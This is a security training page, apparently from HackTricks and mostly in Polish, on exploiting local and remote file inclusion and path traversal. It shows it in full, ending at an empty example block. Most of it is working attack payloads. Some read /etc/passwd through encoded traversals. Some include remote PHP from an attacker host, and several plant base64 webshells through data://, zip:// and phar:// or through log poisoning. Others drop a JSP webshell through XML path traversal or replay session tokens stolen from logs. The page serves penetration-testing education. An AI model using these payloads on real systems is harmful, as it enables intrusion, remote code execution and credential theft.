# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Plik jest ładowany z zdalnego serwera (Najlepiej: możesz napisać kod, a serwer go wykona). W PHP jest to domyślnie **wyłączone** (**allow_url_include**).\
**Local File Inclusion (LFI):** Serwer ładuje lokalny plik.

Luka występuje, gdy użytkownik w pewien sposób kontroluje plik, który ma zostać załadowany przez serwer.

Podatne **funkcje PHP**: require, require_once, include, include_once

Interesujące narzędzie do wykorzystania tej luki: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Łącząc kilka list LFI dla \*nix i dodając więcej ścieżek, stworzyłem tę listę:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Spróbuj także zamienić `/` na `\`\
Spróbuj także dodać `../../../../../`

Listę, która używa kilku technik do znalezienia pliku /etc/password (aby sprawdzić, czy luka istnieje), można znaleźć [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Połączenie różnych wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Spróbuj także zamienić `/` na `\`\
Spróbuj także usunąć `C:/` i dodać `../../../../../`

Listę, która używa kilku technik do znalezienia pliku /boot.ini (aby sprawdzić, czy luka istnieje), można znaleźć [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Sprawdź listę LFI dla Linux.

## Podstawowe LFI i obejścia

Wszystkie przykłady dotyczą Local File Inclusion, ale mogą być również zastosowane do Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences usuwane bez rekurencji
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass dopisywania dodatkowych znaków na końcu podanego ciągu (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
To zostało **rozwiązane od PHP 5.4**

### **Kodowanie**

Możesz użyć niestandardowych kodowań, takich jak double URL encode (i inne):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### HTML-to-PDF SVG/IMG path traversal

Nowoczesne HTML-to-PDF engines (e.g. **TCPDF** or wrappers such as **html2pdf**) chętnie parsują attacker-provided HTML, SVG, CSS, and font URLs, jednak działają wewnątrz zaufanych sieci backendowych z dostępem do systemu plików. Gdy możesz wstrzyknąć HTML do `$pdf->writeHTML()`/`Html2Pdf::writeHTML()`, często możesz exfiltrate local files, które konto serwera WWW może odczytać.

- **Fingerprint the renderer**: każdy wygenerowany PDF zawiera pole `Producer` (e.g. `TCPDF 6.8.2`). Znajomość dokładnego builda mówi Ci, jakie filtry ścieżek istnieją oraz czy URL decoding następuje przed walidacją.
- **Inline SVG payloads**: `TCPDF::startSVGElementHandler()` odczytuje atrybut `xlink:href` z elementów `<image>` przed wywołaniem `urldecode()`. Osadzenie złośliwego SVG wewnątrz data URI powoduje, że wiele sanitizerów HTML zignoruje payload, podczas gdy TCPDF nadal go parsuje:
```
<img src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMCAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSB4bGluazpocmVmPSIuLi8uLi8uLi8uLi8uLi90bXAvdXNlcl9maWxlcy91c2VyXzEvcHJpdmF0ZV9pbWFnZS5wbmciIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiLz48L3N2Zz4=" />
```
TCPDF poprzedza ścieżki zaczynające się od `/` przez `$_SERVER['DOCUMENT_ROOT']` i dopiero później rozwiązuje `..`, więc użyj albo wiodących segmentów `../../..` albo `/../../..`, aby wyjść poza katalog root po tym poprzedzeniu.
- **Kodowanie omijające proste filtry**: Wersje ≤6.8.2 sprawdzają jedynie dosłowny podciąg `../` *przed* dekodowaniem URL. Wysłanie `..%2f` (lub `..%2F`) w SVG albo w surowym atrybucie `<img src>` omija kontrolę, ponieważ sekwencja ../ zostaje odtworzona dopiero po wywołaniu `urldecode()` przez TCPDF.
- **Podwójne kodowanie dla wieloetapowego dekodowania**: Jeśli dane od użytkownika są dekodowane przez web framework *i* przez TCPDF, podwójnie zakoduj slash (`%252f`). Jedno dekodowanie zamienia go w `%2f`, drugie w TCPDF w `/`, co daje `/..%252f..` → `/../../../…` bez nigdy ujawniania `../` wczesnemu filtrowi.
- **HTML `<img>` handler**: `TCPDF::openHTMLTagHandler()` zawiera ten sam błąd kolejności operacji, pozwalając na bezpośrednie payloady HTML, takie jak `src="%2f..%252f..%252ftmp%252fsecret.png"`, aby odczytać dowolną lokalnie dostępną bitmapę.

Ta technika leaks wszystko, co jest czytelne przez PDF worker (skany paszportów, API keys wyrenderowane jako obrazy itp.). Naprawiono to w wersji 6.9.1 przez kanonizację ścieżek (`isRelativePath()`), więc podczas testów priorytetowo traktuj starsze wersje `Producer`.

### Z istniejącego folderu

Może back-end sprawdza ścieżkę folderu:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Eksploracja katalogów systemu plików na serwerze

System plików serwera można eksplorować rekurencyjnie, aby zidentyfikować katalogi, nie tylko pliki, stosując pewne techniki. Proces ten polega na określeniu głębokości katalogu i sprawdzaniu istnienia konkretnych folderów. Poniżej znajduje się szczegółowa metoda, jak to osiągnąć:

1. **Określ głębokość katalogu:** Ustal głębokość bieżącego katalogu, pobierając pomyślnie plik `/etc/passwd` (ma to zastosowanie, jeśli serwer jest oparty na Linuxie). Przykładowy URL może być zbudowany w następujący sposób, wskazując głębokość równą 3:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Skanowanie folderów:** Dołącz nazwę podejrzanego folderu (np. `private`) do adresu URL, a następnie wróć do `/etc/passwd`. Dodatkowy poziom katalogu wymaga zwiększenia głębokości o jeden:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretacja wyników:** Odpowiedź serwera wskazuje, czy folder istnieje:
- **Błąd / Brak wyjścia:** Folder `private` prawdopodobnie nie istnieje w określonej lokalizacji.
- **Zawartość `/etc/passwd`:** Potwierdza to obecność folderu `private`.
4. **Rekurencyjne eksplorowanie:** Odnalezione foldery można dalej badać pod kątem podkatalogów lub plików, używając tej samej techniki lub tradycyjnych metod Local File Inclusion (LFI).

Aby eksplorować katalogi w innych lokalizacjach systemu plików, dostosuj payload odpowiednio. Na przykład, aby sprawdzić czy `/var/www/` zawiera katalog `private` (zakładając, że bieżący katalog znajduje się na głębokości 3), użyj:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation jest metodą stosowaną do manipulowania ścieżkami plików w aplikacjach webowych. Często używa się jej do uzyskania dostępu do plików o ograniczonym dostępie poprzez obejście pewnych mechanizmów bezpieczeństwa, które dopisują dodatkowe znaki na końcu ścieżek plików. Celem jest skonstruowanie ścieżki pliku, która po zmianie przez mechanizm bezpieczeństwa nadal będzie wskazywać żądany plik.

W PHP różne reprezentacje ścieżki pliku mogą być traktowane jako równoważne ze względu na sposób działania systemu plików. Na przykład:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` i `/etc/passwd/` są traktowane jako ta sama ścieżka.
- Gdy ostatnie 6 znaków to `passwd`, dopisanie `/` (tworząc `passwd/`) nie zmienia wskazywanego pliku.
- Podobnie, jeśli do ścieżki pliku dopisane jest `.php` (np. `shellcode.php`), dodanie `/.` na końcu nie zmieni dostępowanego pliku.

Poniższe przykłady pokazują, jak użyć path truncation, aby uzyskać dostęp do `/etc/passwd`, często celem ze względu na jego wrażliwą zawartość (informacje o kontach użytkowników):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
W tych scenariuszach liczba potrzebnych traversals może wynosić około 2027, ale ta wartość może się różnić w zależności od konfiguracji serwera.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) połączone z dodatkowymi segmentami kropkowymi i znakami mogą służyć do poruszania się po systemie plików, skutecznie ignorując przez serwer dopisywane ciągi.
- **Determining the Required Number of Traversals**: Dzięki metodzie prób i błędów można znaleźć dokładną liczbę sekwencji `../` potrzebną do przejścia do katalogu root, a następnie do `/etc/passwd`, upewniając się, że wszystkie dopisane ciągi (np. `.php`) zostaną zneutralizowane, a żądana ścieżka (`/etc/passwd`) pozostanie nienaruszona.
- **Starting with a Fake Directory**: Powszechną praktyką jest rozpoczęcie ścieżki od nieistniejącego katalogu (np. `a/`). Technika ta stosowana jest jako środek ostrożności lub aby spełnić wymagania logiki parsowania ścieżek po stronie serwera.

Stosując path truncation techniques, kluczowe jest zrozumienie sposobu parsowania ścieżek przez serwer oraz struktury systemu plików. Każdy scenariusz może wymagać innego podejścia, dlatego często konieczne są testy, aby znaleźć najbardziej efektywną metodę.

**Ta podatność została naprawiona w PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

W php jest to domyślnie wyłączone, ponieważ **`allow_url_include`** jest **Off.** Musi być **On**, żeby to działało, i w takim przypadku możesz dołączyć plik PHP z twojego serwera i uzyskać RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Jeśli z jakiegoś powodu **`allow_url_include`** jest **On**, ale PHP **filtrowuje** dostęp do zewnętrznych stron, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), możesz na przykład użyć data protocol z base64, aby zdekodować b64 PHP code i uzyskać RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> W poprzednim kodzie końcowy `+.txt` został dodany, ponieważ atakujący potrzebował ciągu, który kończył się na `.txt`, więc ciąg kończy się nim i po dekodowaniu b64 ta część zwróci tylko śmieci, a prawdziwy kod PHP zostanie dołączony (i w związku z tym wykonany).
>
> Innym przykładem **nieużywającym protokołu `php://`** byłby:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root element

W Pythonie, w kodzie takim jak ten:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Jeśli użytkownik poda **absolute path** do **`file_name`**, **previous path is just removed**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Jest to zamierzone zachowanie zgodnie z [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Jeśli komponent jest ścieżką absolutną, wszystkie poprzednie komponenty są odrzucane, a łączenie kontynuuje się od komponentu ze ścieżką absolutną.

## Java — listowanie katalogów

Wygląda na to, że jeśli masz Path Traversal w Java i **poprosisz o katalog** zamiast pliku, zostanie zwrócone **listowanie katalogu**. To nie będzie mieć miejsca w innych językach (o ile mi wiadomo).

## Top 25 parametrów

Oto lista 25 parametrów, które mogą być podatne na local file inclusion (LFI) (źródło: [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters pozwalają wykonać podstawowe **operacje modyfikacji danych** zanim zostaną one odczytane lub zapisane. Istnieje 5 kategorii filtrów:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Usuwa tagi z danych (wszystko pomiędzy znakami "<" i ">")
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Przekształca do innego kodowania(`convert.iconv.<input_enc>.<output_enc>`). Aby uzyskać **listę wszystkich obsługiwanych kodowań** uruchom w konsoli: `iconv -l`

> [!WARNING]
> Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Kompresuje zawartość (przydatne przy wyeksfiltracji dużej ilości informacji)
- `zlib.inflate`: Dekompresuje dane
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Przestarzałe
- `mdecrypt.*` : Przestarzałe
- Other Filters
- Uruchamiając w php `var_dump(stream_get_filters());` możesz znaleźć kilka **nieoczekiwanych filtrów**:
- `consumed`
- `dechunk`: odwraca HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Część "php://filter" nie rozróżnia wielkości liter

### Using php filters as oracle to read arbitrary files

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) zaproponowano technikę odczytu lokalnego pliku bez zwracania jego zawartości przez serwer. Technika ta opiera się na **boolean exfiltration of the file (char by char) using php filters** jako oracle. Dzieje się tak, ponieważ php filters mogą być użyte do powiększenia tekstu na tyle, by php rzucił wyjątek.

W oryginalnym artykule znajdziesz szczegółowe wyjaśnienie techniki, poniżej krótkie podsumowanie:

- Użyj codec **`UCS-4LE`**, aby pozostawić wiodący znak tekstu na początku i sprawić, że rozmiar stringa rośnie wykładniczo.
- To zostanie użyte do wygenerowania **tekstu tak dużego gdy początkowa litera będzie odgadnięta poprawnie**, że php wywoła **błąd**.
- Filtr **dechunk** **usunie wszystko jeśli pierwszy znak nie jest heksadecymalny**, więc możemy dowiedzieć się, czy pierwszy znak jest hex.
- To, połączone z poprzednim (i innymi filtrami zależnymi od odgadniętej litery), pozwoli nam odgadnąć literę na początku tekstu obserwując, kiedy wykonamy wystarczająco dużo transformacji, żeby przestała być znakiem heksadecymalnym. Ponieważ jeśli jest hex, dechunk jej nie usunie i początkowa bomba spowoduje błąd php.
- Codec **convert.iconv.UNICODE.CP930** zamienia każdą literę na następną (więc po tym codec: a -> b). Pozwala to odkryć, czy pierwsza litera to na przykład `a`, ponieważ jeśli zastosujemy 6 razy ten codec a->b->c->d->e->f->g, litera przestaje być znakiem heksadecymalnym, więc dechunk jej nie usuwa i wyzwalany jest błąd php z powodu początkowej bomby.
- Używając innych transformacji jak **rot13** na początku można wypuścić inne znaki jak n, o, p, q, r (i inne codecy mogą być użyte do przesunięcia innych liter do zakresu hex).
- Gdy początkowy znak jest cyfrą, trzeba go zakodować do base64 i wyciec pierwsze 2 litery, żeby odsłonić cyfrę.
- Końcowym problemem jest zobaczyć **jak wyciec więcej niż początkowa litera**. Używając filtrów zmieniających kolejność bajtów jak **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** można zmienić porządek znaków i uzyskać na pierwszej pozycji inne litery z tekstu.
- A aby móc uzyskać **dalsze dane** pomysł polega na **wygenerowaniu 2 bajtów śmieci na początku** za pomocą **convert.iconv.UTF16.UTF16**, zastosowaniu **UCS-4LE** aby zrobić **pivot z następnymi 2 bajtami**, i **usunąć dane aż do śmieci** (to usunie pierwsze 2 bajty z początkowego tekstu). Kontynuuj to aż dotrzesz do pożądanego fragmentu do wycieku.

W artykule opublikowano także narzędzie wykonujące to automatycznie: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Ten wrapper pozwala uzyskać dostęp do file descriptors, które proces ma otwarte. Potencjalnie użyteczny do exfiltrate zawartości otwartych plików:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Możesz także użyć **php://stdin, php://stdout and php://stderr** aby uzyskać dostęp do **file descriptors 0, 1 and 2** odpowiednio (nie jestem pewien, jak mogłoby to być przydatne w ataku)

### zip:// and rar://

Prześlij plik Zip lub Rar z PHPShell w środku i uzyskaj do niego dostęp.\
Aby móc nadużyć protokołu rar, musi on być **specjalnie aktywowany**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Zwróć uwagę, że ten protokół jest ograniczony przez konfiguracje php **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect musi być aktywowany. Możesz wykonać kod używając tego:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Określ swój payload w parametrach POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Plik `.phar` może być wykorzystany do uruchomienia kodu PHP, gdy aplikacja webowa używa funkcji takich jak `include` do ładowania plików. Poniższy fragment kodu PHP demonstruje tworzenie pliku `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Aby skompilować plik `.phar`, należy wykonać następujące polecenie:
```bash
php --define phar.readonly=0 create_path.php
```
Po uruchomieniu zostanie utworzony plik o nazwie `test.phar`, który może zostać wykorzystany do ataku na Local File Inclusion (LFI).

W przypadkach, gdy LFI tylko odczytuje pliki bez wykonywania zawartego w nich kodu PHP, przy użyciu funkcji takich jak `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` lub `filesize()`, można spróbować wykorzystać lukę w deserializacji. Ta luka związana jest z odczytem plików przy użyciu protokołu `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Było możliwe nadużycie **any arbitrary file read from PHP that supports php filters** żeby uzyskać RCE. Szczegółowy opis można [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Bardzo krótkie podsumowanie: **3 byte overflow** w heapie PHP został wykorzystany do **zmiany łańcucha wolnych chunków** o określonym rozmiarze, aby móc **zapisać cokolwiek pod dowolnym adresem**, więc dodano hook wywołujący **`system`**.\
Możliwe było alokowanie chunków o specyficznych rozmiarach przez nadużycie kolejnych php filters.

### More protocols

Sprawdź więcej możliwych[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Zapis w pamięci lub w pliku tymczasowym (nie jestem pewien, jak może to być użyteczne w file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Dostęp do lokalnego systemu plików
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Dostęp do HTTP(s) URLi
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Dostęp do FTP(s) URLi
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Strumienie kompresji
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Znajdowanie nazw ścieżek pasujących do wzorca (Nie zwraca niczego czytelnego, więc tu niezbyt przydatny)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Strumienie audio (Nieprzydatne do odczytu dowolnych plików)

## LFI via PHP's 'assert'

Ryzyko związane z Local File Inclusion (LFI) w PHP jest szczególnie wysokie przy użyciu funkcji 'assert', która może wykonywać kod zawarty w stringach. Jest to szczególnie problematyczne, jeśli wejście zawierające znaki directory traversal, takie jak "..", jest sprawdzane, ale nieprawidłowo oczyszczone.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Chociaż ma to na celu zapobieganie traversal, niezamierzenie tworzy wektor umożliwiający code injection. Aby wykorzystać to do odczytania zawartości pliku, atakujący mógłby użyć:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Podobnie, do wykonywania dowolnych poleceń systemowych można użyć:
```plaintext
' and die(system("id")) or '
```
Ważne jest, aby **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ta technika ma zastosowanie w przypadkach, gdy masz **kontrolę** nad **ścieżką pliku** używaną przez **funkcję PHP**, która będzie **dostępować się do pliku**, ale nie zobaczysz zawartości pliku (np. proste wywołanie **`file()`**) — zawartość nie jest wyświetlana.

W [**tym niesamowitym poście**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wyjaśniono, jak blind path traversal może być nadużyty za pomocą PHP filter, aby **exfiltrate the content of a file via an error oracle**.

W skrócie, technika używa kodowania **"UCS-4LE"** aby sprawić, że zawartość pliku będzie tak **duża**, że **funkcja PHP otwierająca** plik wywoła **błąd**.

Następnie, aby leak the first char, używany jest filtr `dechunk` wraz z innymi, takimi jak **base64** czy **rot13**, a ostatecznie stosuje się filtry **convert.iconv.UCS-4.UCS-4LE** oraz **convert.iconv.UTF16.UTF-16BE**, aby **umieścić inne znaki na początku i leak them**.

**Funkcje, które mogą być podatne**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Szczegóły techniczne znajdziesz w wymienionym poście!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Gdy kod po stronie serwera, który przyjmuje/uploaduje pliki, buduje ścieżkę docelową używając danych kontrolowanych przez użytkownika (np. nazwy pliku lub URL) bez kanonizacji i walidacji, segmenty `..` oraz ścieżki bezwzględne mogą uciec z zamierzonego katalogu i spowodować zapis dowolnego pliku. Jeśli możesz umieścić payload w web-exposed directory, zwykle uzyskujesz nieautoryzowane RCE poprzez wrzucenie webshell.

Typowy przebieg eksploatacji:
- Zidentyfikuj write primitive w endpoint lub background workerze, który akceptuje ścieżkę/nazwę pliku i zapisuje zawartość na dysk (np. message-driven ingestion, XML/JSON command handlers, ZIP extractors itp.).
- Określ web-exposed directories. Typowe przykłady:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Sporządź traversal path, który wyjdzie z zamierzonego katalogu storage do webroot i zawrzyj zawartość webshell.
- Przejdź do upuszczonego payload i wykonaj polecenia.

Uwagi:
- Usługa podatna na zapis może nasłuchiwać na porcie nie-HTTP (np. JMF XML listener na TCP 4004). Główny portal webowy (inny port) później będzie serwował Twój payload.
- Na stackach Java takie zapisy plików są często implementowane poprzez zwykłe konkatenacje `File`/`Paths`. Brak canonicalisation/allow-listing jest podstawową wadą.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Zabezpieczenia, które eliminują tę klasę błędów:
- Rozwiąż do ścieżki kanonicznej i egzekwuj, że jest potomkiem katalogu bazowego z listy dozwolonych.
- Odrzucaj każdą ścieżkę zawierającą `..`, ścieżkę absolutną lub literę dysku; preferuj generowane nazwy plików.
- Uruchamiaj proces zapisujący jako konto o niskich uprawnieniach i oddziel katalogi zapisu od katalogów serwowanych.

## Remote File Inclusion

Wyjaśniono wcześniej, [**follow this link**](#remote-file-inclusion).

### Przez plik logu Apache/Nginx

Jeśli serwer Apache lub Nginx jest **podatny na LFI** wewnątrz funkcji include, możesz spróbować uzyskać dostęp do **`/var/log/apache2/access.log` lub `/var/log/nginx/access.log`**, umieścić w **user agent** lub w **GET parameter** php shell taki jak **`<?php system($_GET['c']); ?>`** i dołączyć ten plik

> [!WARNING]
> Należy pamiętać, że **jeśli użyjesz podwójnych cudzysłowów** dla shel'a zamiast **pojedynczych cudzysłowów**, podwójne cudzysłowy zostaną zmienione na ciąg "_**quote;**_", **PHP zgłosi błąd** i **nic więcej nie zostanie wykonane**.
>
> Upewnij się też, że **prawidłowo zapiszesz payload** albo PHP będzie zgłaszać błąd za każdym razem, gdy spróbuje załadować plik logu i nie będziesz miał drugiej szansy.

To można też zrobić w innych logach, ale **uważaj,** kod w logach może być URL encoded i to może zniszczyć Shell. Nagłówek **authorisation "basic"** zawiera "user:password" w Base64 i jest dekodowany w logach. PHPShell może być wstawiony w tym nagłówku.\
Inne możliwe ścieżki logów:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Odczytuj logi dostępu, aby pozyskać GET-based auth tokens (token replay)

Wiele aplikacji błędnie akceptuje session/auth tokens przez GET (np. AuthenticationToken, token, sid). Jeśli masz primitive path traversal/LFI do logów serwera WWW, możesz ukraść te tokeny z access logs i odtworzyć je, aby całkowicie obejść uwierzytelnianie.

Jak to zrobić:
- Użyj traversal/LFI, aby odczytać web server access log. Typowe lokalizacje:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Niektóre endpointy zwracają odczytane pliki Base64-encoded. Jeśli tak, zdeoduj lokalnie i przejrzyj linie logów.
- Grep for GET requests that include a token parameter and capture its value, then replay it against the application entry point.

Example flow (generic):
```http
